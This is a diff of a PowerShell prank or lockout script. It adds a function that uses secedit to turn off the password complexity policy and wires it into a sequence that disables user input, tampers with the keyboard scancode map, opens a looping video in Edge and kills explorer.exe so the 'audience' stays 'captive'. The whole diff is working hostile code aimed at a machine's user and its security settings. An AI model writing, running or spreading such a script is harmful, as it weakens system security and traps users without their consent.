@@ -45,6 +45,16 @@ Function KillKeyLayout ()
     reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /f
 }    
 
+Function DisableSecureLogOn () 
+{
+    #wraps Secedit to perform command since Powershell can't
+    #current replaces password policy. Want to change to edit Secure Log On (that requires CTRL ALT DEL)
+    secedit /export /cfg c:\new.cfg
+    ${c:new.cfg}=${c:new.cfg} | % {$_.Replace('PasswordComplexity=1', 'PasswordComplexity=0')}
+    secedit /configure /db $env:windir\security\new.sdb /cfg c:\new.cfg /areas SECURITYPOLICY
+    del c:\new.cfg
+}
+
 # Start the app
 $app='microsoft-edge'
 $value='https://www.youtube.com/embed/qxEh09JttN4?rel=0&amp;autoplay=1;fs=0;autohide=0;hd=0;playlist=qxEh09JttN4&autoplay=1&loop=1'
@@ -68,8 +78,12 @@ function Disable-UserInput($seconds) {
 }
 
 Disable-UserInput -seconds 15 | Out-Null
-
+DisableSecureLogOn
 KillKeyLayout
 
+# Restart explorer to force it to load the bad key layout
 taskkill /f /im explorer.exe
 start explorer.exe
+
+# Now kill explorer again. Because we want our audience captive. :)
+taskkill /f /im explorer.exe
